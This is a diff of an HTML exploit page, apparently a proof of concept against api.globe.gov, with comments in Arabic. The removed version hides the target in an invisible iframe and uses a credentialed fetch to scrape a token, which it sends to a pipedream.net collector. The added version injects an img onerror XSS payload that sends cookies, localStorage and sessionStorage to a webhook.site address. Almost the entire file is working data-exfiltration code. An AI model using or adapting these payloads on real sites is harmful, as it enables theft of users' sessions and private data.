@@ -1,46 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Combined Exploit</title>
-  <style>
-    iframe {
-      width: 100%;
-      height: 800px;
-      opacity: 0; /* لإخفاء الـ iframe (clickjacking) */
-      pointer-events: none;
-    }
-  </style>
-</head>
-<body>
-  <h2>Loading GLOBE content...</h2>
+  <body>
+    <h2>🔥 DOM-XSS + Data Leak via globe.gov</h2>
+    <iframe id="x" style="width:0;height:0;border:0;"></iframe>
+    <script>
+      const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
 
-  <iframe id="targetFrame" src="https://api.globe.gov/search/swagger-ui.html"></iframe>
+      // سيناريو تنفيذ يدوي داخل iframe (حتى لو لم ينعكس شيء)
+      const injectedHTML = `<img src=x onerror="fetch('${webhook}', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          cookie: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          userAgent: navigator.userAgent,
+          location: location.href
+        })
+      })">`;
 
-  <script>
-    // تنفيذ سلسلة استغلال CORS + Clickjacking + Token Leak
-    setTimeout(() => {
-      fetch("https://api.globe.gov/search/swagger-ui.html", {
-        method: "GET",
-        credentials: "include"
-      })
-        .then(res => res.text())
-        .then(data => {
-          const tokenMatch = data.match(/token=([a-zA-Z0-9_-]+)/);
-          const token = tokenMatch ? tokenMatch[1] : "not_found";
-
-          fetch("https://eoat1elxcyeymir.m.pipedream.net", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              origin: document.location.href,
-              leaked_token: token,
-              preview_snippet: data.slice(0, 500)
-            })
-          });
-        });
-    }, 2000);
-  </script>
-</body>
+      // حقن السكربت داخل iframe
+      const iframe = document.getElementById("x");
+      const doc = iframe.contentWindow.document;
+      doc.open();
+      doc.write(injectedHTML);
+      doc.close();
+    </script>
+  </body>
 </html>
